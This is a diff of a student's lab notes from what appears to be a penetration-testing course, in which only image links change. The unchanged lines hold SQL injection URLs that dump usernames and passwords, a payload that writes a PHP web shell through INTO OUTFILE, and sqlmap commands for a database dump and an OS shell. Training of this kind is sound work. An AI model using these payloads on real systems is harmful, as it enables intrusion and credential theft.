@@ -133,8 +133,8 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 
 1.  Enumerate the structure of the database using SQL injection.
 We can enumerate the number of columns through trial and error via `union select all 1,2,...` 
-![[Pasted image 20220620165113.png]]
-![[Pasted image 20220620165813.png]]
+![[sqli_column_error.png]]
+![[slqi_columns.png]]
 Once we understand the number of columns we are able to work with we can begin enumerating different aspects of the databse. For example:
 version information
 `http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version`
@@ -151,7 +151,7 @@ The reason our malicious queries are being displayed on the screen has to do wit
 3.  Extract all users and associated passwords from the database.
 The following url will extract usernames and passwords from the "users" table:
 `http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users`
-![[Pasted image 20220620172230.png]]
+![[sqli_passwords.png]]
 
 
 # 9.9.11 From SQL Injection to Code Execution
@@ -163,11 +163,11 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 To do this we simply need to append the end of our sql injection url, adding the creation of a malicious php file.
 `http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
 This creates the new endpoint "backdoor.php" which allows us to specify a command to run via the arguement "cmd=". Here, we are running the ipconfig command.
-![[Pasted image 20220620174054.png]]
+![[sql_cmd_injection.png]]
 
 2.  Turn the simple code execution into a full shell.
 To gain a shell we simply replace our previous ipconfig command with a reverse shell.
-![[Pasted image 20220620174529.png]]
+![[sql_cmd_injection_ revshell.png]]
 
 
 # 9.9.13 Automating SQL Injection
@@ -184,7 +184,8 @@ From here we can quickly enumerate the databses:
 `-D Foo -T bar --columns` output a list of columns from the "bar" table in "Foo" database
 For this particular exercise we need to output the entire "webappdb" database which we can do with the following command:
 `sqlmap -u http://192.168.157.10/debug.php?id=1 -p "id" -D webappdb --dump`
-![[Pasted image 20220620175613.png]]
+![[sqlmap_database.png]]
 
 3.  Use sqlmap to obtain an interactive shell.
 This is achieved by passing the "os-shell" arguement.
+![[sqlmap_os_sheell.png]]
